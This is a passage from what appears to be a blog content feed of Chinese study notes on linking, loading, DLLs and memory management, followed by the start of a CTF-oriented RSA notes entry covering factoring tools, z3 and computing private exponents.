&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;maximum malloc size = %u bytes\n&quot;</span>, maximum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在我的 Linux 环境（64 位的虚拟机环境）下，结果大约是 2.8 GB  </li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618836201223-444f74dd-6b41-4093-87ff-93d57e647f7b.png" alt="image.png"></p>
<ul>
<li>在我的 Windows 环境（64 位）下，结果大约是 1.8 GB</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618836491880-d01a62c4-fd3d-4097-8689-b1ad5f9d2cd1.png" alt="image.png"></p>
<ul>
<li>影响 malloc 最大内存申请量的因素<ul>
<li>操作系统版本</li>
<li>程序本身大小</li>
<li>用到的动态/共享库数量、大小</li>
<li>程序栈数量、大小</li>
</ul>
</li>
</ul>
<h3 id="Linux-内核装载-ELF-的过程"><a href="#Linux-内核装载-ELF-的过程" class="headerlink" title="Linux 内核装载 ELF 的过程"></a>Linux 内核装载 ELF 的过程</h3><h4 id="1-用户层面"><a href="#1-用户层面" class="headerlink" title="1 用户层面"></a>1 用户层面</h4><ul>
<li>bash 进程调用 <code>fork()</code> 创建一个新的进程</li>
<li>新的进程调用 <code>execve()</code> 执行指定 ELF </li>
</ul>
<h4 id="2-内核层面"><a href="#2-内核层面" class="headerlink" title="2 内核层面"></a>2 内核层面</h4><p>进入 <code>execve()</code> 系统调用后</p>
<ul>
<li>内核中 <code>execve()</code> 入口是 <code>sys_execve()</code>，<code>sys_execve()</code> 进行一些参数的检查复制后，调用 <code>do_execve()</code> </li>
<li><code>do_execve()</code> 查找被执行的文件，并读取文件的前 128 个字节，判断文件格式。然后调用 <code>search_binary_handle()</code> 搜索合适的装载处理过程。</li>
<li>针对 ELF 的装载处理过程是 <code>load_elf_binary()</code> </li>
<li>装载处理完成后，返回至 <code>do_execve()</code> 再执行返回至 <code>sys_execve()</code> ，随即从内核态返回到用户态，EIP 寄存器直接跳转到 ELF 程序入口地址，新的程序开始执行，ELF 文件装载完成。</li>
</ul>
<h3 id="Windows-PE-的装载"><a href="#Windows-PE-的装载" class="headerlink" title="Windows PE 的装载"></a>Windows PE 的装载</h3><ul>
<li>读取文件的第一个页（其中包含 DOS 头，PE 文件头和段表）</li>
<li>检查进程地址空间中，目标地址是否可用，不可用则另选一个装载地址（针对 DLL）</li>
<li>使用段表提供的信息，将 PE 文件中所有的段一一映射到地址空间中相应的位置</li>
<li>如果装载地址不是目标地址，则 Rebasing</li>
<li>装载所有需要的 DLL</li>
<li>将 PE 文件中所有导入的符号进行符号解析</li>
<li>根据 PE 头中指定的参数，建立初始化栈和堆</li>
<li>建立主线程并启动进程</li>
</ul>
<h2 id="第九章-Windows-下的动态链接"><a href="#第九章-Windows-下的动态链接" class="headerlink" title="第九章 Windows 下的动态链接"></a>第九章 Windows 下的动态链接</h2><h3 id="9-1-DLL-简介"><a href="#9-1-DLL-简介" class="headerlink" title="9.1 DLL 简介"></a>9.1 DLL 简介</h3><p>DLL 即动态链接库 Dynamic-Link Library。</p>
<ul>
<li>DLL 与 ELF 的区别：ELF 中代码段是地址无关的，可以实现进程间共享一份代码；DLL 的代码不是地址无关的，只能在某些情况下可以被多个进程共享</li>
</ul>
<h4 id="9-1-1-如何创建DLL"><a href="#9-1-1-如何创建DLL" class="headerlink" title="9.1.1 如何创建DLL"></a>9.1.1 如何创建DLL</h4><ul>
<li>MSVC 编译器工具路径 C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\bin\Hostx64\x64，可以在开始菜单进入 Command Prompt 使用 cl</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619009002528-08db24aa-9b77-463c-881a-7e5a3c42b226.png" alt="img"></p>
<ul>
<li>Math.c 示例代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__declspec(dllexport) double Add(double a, double b)</span><br><span class="line">&#123;</span><br><span class="line">    return a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__declspec(dllexport) double Sub(double a, double b)</span><br><span class="line">&#123;</span><br><span class="line">    return a - b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__declspec(dllexport) double Mul(double a, double b)</span><br><span class="line">&#123;</span><br><span class="line">    return a * b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>cl /LDd Math.c</code> 生成 Debug 版的 DLL（/LD 是 Release 版的 DLL）</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619009060202-324978ed-f44d-42c9-bfc3-ca24b1335e34.png" alt="img"></p>
<ul>
<li>生成的 4 个文件默认输出到 C:\Windows\System32，其中 Math.dll 就是我们需要的文件</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619009150490-b5805769-5f18-48a4-9b52-2c8a8551b5f8.png" alt="img"></p>
<ul>
<li><code>dumpbin /EXPORTS Math.dll</code> （dumpbin 工具和 cl 在同一目录）查看 DLL 的导出符号</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619009490802-53309843-8d54-4191-b2dd-e0a9d0dec258.png" alt="img"></p>
<h4 id="9-1-2-如何使用-DLL"><a href="#9-1-2-如何使用-DLL" class="headerlink" title="9.1.2 如何使用 DLL"></a>9.1.2 如何使用 DLL</h4><h5 id="a-静态链接（dllimport-导入符号）"><a href="#a-静态链接（dllimport-导入符号）" class="headerlink" title="a. 静态链接（dllimport 导入符号）"></a>a. 静态链接（dllimport 导入符号）</h5><ul>
<li><code>__declspec(dllimport)</code> 显式声明某个符号为导入符号</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">__declspec(dllimport) double Sub(double a, double b);</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">    double result = Sub(3.0, 2.0);</span><br><span class="line">    printf(&quot;Result = %f\n&quot;, result);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>cl /c TestMath.c</code> 将 c 代码编译成 obj，注意 command prompt 输出默认都在 C:\Windows\System32</li>
<li><p><code>link TestMath.obj Math.lib</code> 使用链接器 TestMath.obj 和 Math.lib 链接在一起，生成 TestMath.exe 文件</p>
</li>
<li><p>Math.lib 装的是什么：其包含了 TestMath.o 链接 Math.dll 时所需的导入符号以及一部分“桩”代码（“胶水”代码），以便于将程序和 DLL 粘在一起。这样的 lib 文件又被称为<strong>导入库（Import Library）</strong></p>
</li>
<li><p>在命令行运行该文件，可以正常输出结果</p>
</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619010275975-b399b132-39b8-4da3-a527-06a1e32ba7eb.png" alt="img"></p>
<h5 id="b-运行时链接（LoadLibrary-运行时加载）"><a href="#b-运行时链接（LoadLibrary-运行时加载）" class="headerlink" title="b. 运行时链接（LoadLibrary 运行时加载）"></a>b. 运行时链接（LoadLibrary 运行时加载）</h5><ul>
<li>LoadLibrary 装载一个 DLL 到进程的地址空间</li>
<li><p>GetProcAddress 查找某个符号的地址</p>
</li>
<li><p>FreeLibrary 卸载已装载的模块</p>
</li>
<li>示例代码：runtimeLink.c</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">typedef double (*Func) (double, double);</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">    Func function;</span><br><span class="line">    double result;</span><br><span class="line"></span><br><span class="line">    // Load DLL</span><br><span class="line">    HINSTANCE hinstLib = LoadLibrary(&quot;Math.dll&quot;);</span><br><span class="line">    if (hinstLib == NULL) &#123;</span><br><span class="line">        printf(&quot;ERROR: unable to load DLL\n&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Get function address</span><br><span class="line">    function = (Func)GetProcAddress(hinstLib, &quot;Add&quot;);</span><br><span class="line">    if (function == NULL) &#123;</span><br><span class="line">        printf(&quot;ERROR: unable to find DLL function\n&quot;);</span><br><span class="line">        FreeLibrary(hinstLib);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Call function</span><br><span class="line">    result = function(1.0, 2.0);</span><br><span class="line"></span><br><span class="line">    // Unload DLL file</span><br><span class="line">    FreeLibrary(hinstLib);</span><br><span class="line"></span><br><span class="line">    // Display result</span><br><span class="line">    printf(&quot;Result = % f\n&quot;, result);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>编译：<code>cl runtimeLink.c</code> ，得到 runtimeLink.exe ，在命令行运行结果如下。成功调用了 Math.dll 中的 Add 函数  </li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619092840542-0d0a4232-47e2-4caa-9e33-100368967b7a.png" alt="img"></p>
<h3 id="9-2-符号导入导出表"><a href="#9-2-符号导入导出表" class="headerlink" title="9.2 符号导入导出表"></a>9.2 符号导入导出表</h3><h4 id="9-2-1-导出表"><a href="#9-2-1-导出表" class="headerlink" title="9.2.1 导出表"></a>9.2.1 导出表</h4><h5 id="a-什么是导出表"><a href="#a-什么是导出表" class="headerlink" title="a. 什么是导出表"></a>a. 什么是导出表</h5><p>导出表集中了所有导出的符号，提供了符号名与符号地址的映射。</p>
<ul>
<li>路径：C:\Program Files (x86)\Windows Kits\10\Include\10.0.18362.0\um\winnt.h</li>
<li><p>导出表就是其中的 _IMAGE_EXPORT_DIRECTORY 结构体</p>
</li>
<li><p>最后三个成员指向三个重要数组，分别是 导出地址表（EAT，Export Address Table），符号名表（Name Table）和名字序号对应表（Name-Ordinal Table）</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_EXPORT_DIRECTORY &#123;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   Base;</span><br><span class="line">    DWORD   NumberOfFunctions;</span><br><span class="line">    DWORD   NumberOfNames;</span><br><span class="line">    DWORD   AddressOfFunctions;     // RVA from base of image</span><br><span class="line">    DWORD   AddressOfNames;         // RVA from base of image</span><br><span class="line">    DWORD   AddressOfNameOrdinals;  // RVA from base of image</span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure>
<h5 id="b-怎么查看可以导出的函数"><a href="#b-怎么查看可以导出的函数" class="headerlink" title="b. 怎么查看可以导出的函数"></a>b. 怎么查看可以导出的函数</h5><ul>
<li><code>dumpbin /DIRECTIVES Math.obj</code></li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619094010753-1388b44b-58df-4453-88d2-110c69e958a4.png" alt="img"></p>
<h5 id="c-怎么指定导出的符号"><a href="#c-怎么指定导出的符号" class="headerlink" title="c. 怎么指定导出的符号"></a>c. 怎么指定导出的符号</h5><ul>
<li><code>link Math.obj /DLL /EXPORT:Add</code> （会生成三个文件）</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619094061970-f06726fb-76b3-4e85-bd18-255ba04940e5.png" alt="img"></p>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619094414360-aefcbd62-619b-400b-9fc1-e6c72fe05224.png" alt="img"></p>
<h4 id="9-2-2-EXP-文件产生的原因"><a href="#9-2-2-EXP-文件产生的原因" class="headerlink" title="9.2.2 EXP 文件产生的原因"></a>9.2.2 EXP 文件产生的原因</h4><ul>
<li><p>链接器创建 DLL 时与静态链接一样采用两遍扫描过程：</p>
</li>
<li><p>第一遍：遍历所有目标文件并收集所有导出符号信息，创建 DLL 导出表。链接器把导出表放到创建 DLL 时产生的临时文件 EXP 中</p>
</li>
<li>第二遍：链接器把 EXP 和其他输入的目标文件链接在一起并输出 DLL</li>
</ul>
<h4 id="9-2-3-导入表"><a href="#9-2-3-导入表" class="headerlink" title="9.2.3 导入表"></a>9.2.3 导入表</h4><ul>
<li><code>dumpbin /IMPORTS Math.dll</code> 查看导入了哪些函数</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619095216680-6c57a4fd-d8b1-4a69-bbe8-8ef4ec9ff4c8.png" alt="img"></p>
<ul>
<li><p>结构</p>
</li>
<li><p>FirstThunk 指向导入地址数组 IAT</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123;</span><br><span class="line">    union &#123;</span><br><span class="line">        DWORD   Characteristics;            // 0 for terminating null import descriptor</span><br><span class="line">        DWORD   OriginalFirstThunk;         // RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  // 0 if not bound,</span><br><span class="line">                                            // -1 if bound, and real date\time stamp</span><br><span class="line">                                            //     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span><br><span class="line">                                            // O.W. date/time stamp of DLL bound to (Old BIND)</span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 // -1 if no forwarders</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     // RVA to IAT (if bound this IAT has actual addresses)</span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>
<h3 id="9-3-DLL-优化"><a href="#9-3-DLL-优化" class="headerlink" title="9.3 DLL 优化"></a>9.3 DLL 优化</h3><ul>
<li>重定及地址（Rebasing）</li>
<li><p>使用序号导入（只比函数名导入快一点点，另外，Windows API 的导入不能用序号，因为不同版本中函数名不变但序号是不断变化的）</p>
</li>
<li><p>DLL 绑定（导出函数地址保存到导入表）</p>
</li>
</ul>
<h3 id="9-4-C-与动态链接"><a href="#9-4-C-与动态链接" class="headerlink" title="9.4 C++ 与动态链接"></a>9.4 C++ 与动态链接</h3><p>使用 C++ 写动态链接库时，需要注意：</p>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619096253652-42f71892-2225-4d6b-a3a2-67e6886b7d51.png" alt="img"></p>
<h2 id="第四部分-库与运行库"><a href="#第四部分-库与运行库" class="headerlink" title="第四部分 库与运行库"></a>第四部分 库与运行库</h2><h2 id="第十章-内存"><a href="#第十章-内存" class="headerlink" title="第十章 内存"></a>第十章 内存</h2><h3 id="10-1-Linux-下进程地址空间布局"><a href="#10-1-Linux-下进程地址空间布局" class="headerlink" title="10.1 Linux 下进程地址空间布局"></a>10.1 Linux 下进程地址空间布局</h3><ul>
<li>其中动态链接库映射区，用于映射装载的动态链接库。在 Linux 中，如果可执行文件依赖其他共享库，系统就会在 0x40000000 开始处分配相应的空间，将共享库载入该空间</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619167570197-e21929bd-23f3-40b3-9b38-01a078bdb788.png" alt="img"></p>
<h4 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h4><ul>
<li>Q: 程序出现“段错误（segment fault）”或者“非法操作，该内存地址不能 read/write”的原因</li>
<li><p>A: 这时典型的非法指针解引用造成的错误。最普遍的原因有两种</p>
</li>
<li><p>程序员将指针初始化为 NULL，之后没有给一个合理的值就开始使用</p>
</li>
<li>程序员没有初始化栈上的指针，指针的值一般会是随机数，之后就直接开始使用</li>
</ul>
<ul>
<li>Q: 堆总是向上增长吗？</li>
<li>A: 不是，Windows 里大部分堆使用 HeapCreate 产生，其不遵循向上增长这个规律。</li>
</ul>
<h3 id="10-2-栈与调用惯例"><a href="#10-2-栈与调用惯例" class="headerlink" title="10.2 栈与调用惯例"></a>10.2 栈与调用惯例</h3><h4 id="10-2-1-栈和堆栈帧"><a href="#10-2-1-栈和堆栈帧" class="headerlink" title="10.2.1 栈和堆栈帧"></a>10.2.1 栈和堆栈帧</h4><ul>
<li><strong>栈</strong>是向下（低地址）增长的，栈顶由 esp 寄存器进行定位。压栈使栈顶地址减小，弹出使栈顶地址增大。</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619169270677-d5a32c6e-fbe0-4b51-8389-7f0c54e1a248.png" alt="img"></p>
<ul>
<li>栈保存了一个函数调用所需的维护信息：<strong>堆栈帧</strong>（或<strong>活动记录</strong>）</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619169442560-7ceae2a4-c77e-4147-8c65-7fabad39cce1.png" alt="img"></p>
<h4 id="10-2-2-反汇编示例"><a href="#10-2-2-反汇编示例" class="headerlink" title="10.2.2 反汇编示例"></a>10.2.2 反汇编示例</h4><ul>
<li>示例代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int foo()</span><br><span class="line">&#123;</span><br><span class="line">    return 123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619169584780-ca3eff52-29ad-418a-9370-c58aad69e6f6.png" alt="img"></p>
<h4 id="10-2-3-烫烫烫烫"><a href="#10-2-3-烫烫烫烫" class="headerlink" title="10.2.3 烫烫烫烫.."></a>10.2.3 烫烫烫烫..</h4><ul>
<li><p>Q：为什么常看到一些没有初始化的变量或内存区域的值是“烫”？</p>
</li>
<li><p>示例代码</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	char p[12];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>加断点调试监视 p 的数据，会发现  </p>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619170073349-5f03b8c4-aa2f-41a7-9574-7f47c3757542.png" alt="img"></p>
<ul>
<li>A：因为加入调试信息时，会将所有分配出来的栈空间的每个字节都初始化为 0xCC，两个连续排列的 0xCC 的汉字编码就是烫。</li>
</ul>
<p>这仅作为变量是否已经初始化的<strong>参考</strong>，并不能以此为证据，有的编译器会使用 0xCDCDCDCDCD 作为未初始化标记，这时会看到汉字 屯屯</p>
<h4 id="10-2-4-mov-edi-edi"><a href="#10-2-4-mov-edi-edi" class="headerlink" title="10.2.4 mov edi, edi"></a>10.2.4 mov edi, edi</h4><ul>
<li>在 Windows 的函数里，有些函数尽管使用标准的进入指令序列，但在这些指令之前却插入了一些特殊内容：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov edi, edi</span><br></pre></td></tr></table></figure>
<p>这条指令暂时没有什么用处，在汇编之后会变成一个占用两个字节的机器码，纯粹为占位而存在。出于某些目的（如 Hook 技术），可以将占用两个字节的 <code>mov edi, edi</code> 指令替换成另一个 jmp 指令，原函数的调用就会被转换为新函数的调用。</p>
<h4 id="10-2-5-调用惯例"><a href="#10-2-5-调用惯例" class="headerlink" title="10.2.5 调用惯例"></a>10.2.5 调用惯例</h4><p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619358420401-e7a9608f-ef7f-4974-9a43-15201919d152.png" alt="img"></p>
<h3 id="10-3-堆"><a href="#10-3-堆" class="headerlink" title="10.3 堆"></a>10.3 堆</h3><h4 id="10-3-1-malloc-怎么实现的"><a href="#10-3-1-malloc-怎么实现的" class="headerlink" title="10.3.1 malloc 怎么实现的"></a>10.3.1 malloc 怎么实现的</h4><p>程序向操作系统申请一块适当大小的堆空间，然后由程序自己管理这块空间，具体来讲，管理堆空间分配的往往是程序的运行库</p>
<ul>
<li>Q: malloc 申请的内存，进程结束后还会存在吗？</li>
<li>A: 不会，进程结束后，会被操作系统关闭或回收。</li>
</ul>
<ul>
<li><p>Q: malloc 申请的空间是连续的吗？</p>
</li>
<li><p>A: 虚拟空间是连续的，物理空间不一定连续。</p>
</li>
</ul>
<h4 id="10-3-2-Linux-进程堆管理"><a href="#10-3-2-Linux-进程堆管理" class="headerlink" title="10.3.2 Linux 进程堆管理"></a>10.3.2 Linux 进程堆管理</h4><p>Linux 下的进程管理稍微复杂些，它提供了两种堆空间分配方式，即两个系统调用：</p>
<ul>
<li><code>brk()</code>系统调用：设置进程数据段的结束地址</li>
<li><code>mmap()</code> 的作用和 Windows 下的 VirtualAlloc 很相似：向系统申请一段虚拟地址空间</li>
</ul>
<h4 id="10-3-3-Windows-进程堆管理"><a href="#10-3-3-Windows-进程堆管理" class="headerlink" title="10.3.3 Windows 进程堆管理"></a>10.3.3 Windows 进程堆管理</h4><ul>
<li><code>VirtualAlloc()</code></li>
</ul>
<p>首先通过 <code>VirtualAlloc()</code> 向系统一次性批发大量空间，然后根据需要分配给程序</p>
<p>分配算法位于 <strong>堆管理器（Heap manager）</strong>，堆管理器提供了 API：</p>
<ul>
<li>HeapCreate</li>
<li><p>HeapAlloc</p>
</li>
<li><p>HeapFree</p>
</li>
<li>HeapDestroy</li>
</ul>
<h4 id="10-3-4-堆分配算法"><a href="#10-3-4-堆分配算法" class="headerlink" title="10.3.4 堆分配算法"></a>10.3.4 堆分配算法</h4><p>最基本的是空闲链表和位图</p>
<h5 id="a-空闲链表-（Free-List）"><a href="#a-空闲链表-（Free-List）" class="headerlink" title="a. 空闲链表 （Free List）"></a>a. 空闲链表 （Free List）</h5><ul>
<li><strong>概念：</strong>把堆中空闲块按链表的方式连接起来。用户请求一块空间时，遍历，找到合适大小的块并将它拆分；用户释放空间时把它合并到空闲链表中。</li>
<li><p><strong>优点：</strong>实现简单</p>
</li>
<li><p><strong>弊端：</strong>一旦链表被破坏，或者记录长度的四个字节被破坏，整个堆就无法工作。而这些数据恰巧很容易被越界读写接触到。</p>
</li>
</ul>
<h5 id="b-位图-（Bitmap）"><a href="#b-位图-（Bitmap）" class="headerlink" title="b. 位图 （Bitmap）"></a>b. 位图 （Bitmap）</h5><ul>
<li><strong>概念：</strong>把整个堆划分成大量的<strong>块</strong>（block），每个块大小相同。当用户请求内存时，总是分配整数个块给用户，第一个块作为已分配区域的<strong>头（Head）</strong>，其余的作为<strong>主体（Body）</strong>。我们可以用一个整数数组记录块的使用情况，每个块只有 <strong>头、主体、空闲</strong> 三种状态，所以可以用两位表示状态，所以称为位图</li>
<li><p><strong>优点：</strong>快、稳定、易于管理</p>
</li>
<li><p><strong>弊端：</strong></p>
</li>
<li><p>分配内存时容易产生碎片</p>
</li>
<li>堆很大或者块很小时，位图就会很大，可能失去 cache 命中率高的优势，而且会浪费一定的空间。（针对这种情况可以用多级位图）</li>
</ul>
<h5 id="c-对象池"><a href="#c-对象池" class="headerlink" title="c. 对象池"></a>c. 对象池</h5><ul>
<li><strong>使用场景：</strong>被分配对象的大小是较为<strong>固定</strong>的几个值</li>
<li><strong>概念：</strong>如果每次分配空间大小都一样，那就可以按这个大小作为单位，把整个堆空间划分成大量的小块，每次请求只要找一小块。</li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
        <tag>计算机理论</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA知识点总结</title>
    <url>/2020/07/29/RSA%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="大数分解"><a href="#大数分解" class="headerlink" title="大数分解"></a>大数分解</h2><h3 id="大数分解网页"><a href="#大数分解网页" class="headerlink" title="大数分解网页"></a>大数分解网页</h3><p><a href="http://www.factordb.com/index.php">http://www.factordb.com/index.php</a></p>
<h3 id="yafu"><a href="#yafu" class="headerlink" title="yafu"></a>yafu</h3><ol>
<li>运行yafu-x64.exe，在窗口中输入factor(n)，n即为待分解的大数。  </li>
<li>在factor.log中找到分解结果。</li>
</ol>
<h2 id="利用z3解方程"><a href="#利用z3解方程" class="headerlink" title="利用z3解方程"></a>利用z3解方程</h2><p>可以加快解题速度，此处以一个简单的例子展示如何用z3解方程（首先需要安装z3和z3-solver）。<br>$\begin{cases}\ x1+x2=3\\ x1-x2=-1\end{cases}$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x1 = Int(<span class="string">&#x27;x1&#x27;</span>)</span><br><span class="line">x2 = Int(<span class="string">&#x27;x2&#x27;</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(x1 + x2 == <span class="number">3</span>)</span><br><span class="line">s.add(x1 - x2 == -<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> s.check()==sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure>
<p>如例题[GWCTF 2019]BabyRSA</p>
<h2 id="已知p-q-e求d"><a href="#已知p-q-e求d" class="headerlink" title="已知p,q,e求d"></a>已知p,q,e求d</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p=<span class="number">473398607161</span></span><br><span class="line">q=<span class="number">4511491</span></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">n = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extendedEuclid</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y= extendedEuclid(b, a % b)</span><br><span class="line">        x, y = y, (x - (a // b) * y)</span><br><span class="line">        <span class="keyword">return</span> x, y</span><br><span class="line">d = extendedEuclid(e,n)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure>
<h3 id="方法二-常用，gmpy2库-："><a href="#方法二-常用，gmpy2库-：" class="headerlink" title="方法二(常用，gmpy2库)："></a>方法二(常用，gmpy2库)：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 已知e,p,q</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">phin = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phin)</span><br></pre></td></tr></table></figure>
<h3 id="方法三-sage-："><a href="#方法三-sage-：" class="headerlink" title="方法三(sage)："></a>方法三(sage)：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">phin = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,phin)</span><br></pre></td></tr></table></figure>
<h2 id="已知n-dp-e求d"><a href="#已知n-dp-e求d" class="headerlink" title="已知n,dp,e求d"></a>已知n,dp,e求d</h2><p>相关例题如：<a href="#Buuoj_RSA2">Buuoj RSA2</a>  </p>
<ol>
